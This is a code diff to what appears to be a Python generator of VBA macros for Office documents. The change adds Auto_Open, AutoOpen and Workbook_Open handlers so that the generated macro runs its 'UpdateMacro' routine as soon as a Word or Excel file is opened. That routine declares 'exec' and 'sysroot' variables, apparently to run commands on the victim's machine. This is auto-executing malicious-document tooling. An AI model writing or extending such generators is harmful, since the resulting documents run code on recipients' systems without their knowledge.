@@ -61,7 +61,22 @@ else:
  # for i in range(0,3):
  # print str(i) + " " +cut[i]
  
- top = "Sub AutoOpen()\r\n"
+ top = "Sub Auto_Open()\r\n"
+ top = top + "UpdateMacro\r\n"
+ top = top + "End Sub\r\n"
+ top = top + "\r\n"
+
+ top = top + "Sub AutoOpen()\r\n"
+ top = top + "UpdateMacro\r\n"
+ top = top + "End Sub\r\n"
+ top = top + "\r\n"
+
+ top = top + "Sub Workbook_Open()\r\n"
+ top = top + "UpdateMacro\r\n"
+ top = top + "End Sub\r\n"
+ top = top + "\r\n"
+
+ top = top + "Sub UpdateMacro()\r\n"
  top = top + "Dim str As String\r\n"
  top = top + "Dim exec As String\r\n"
  top = top + "Dim sysroot\r\n"
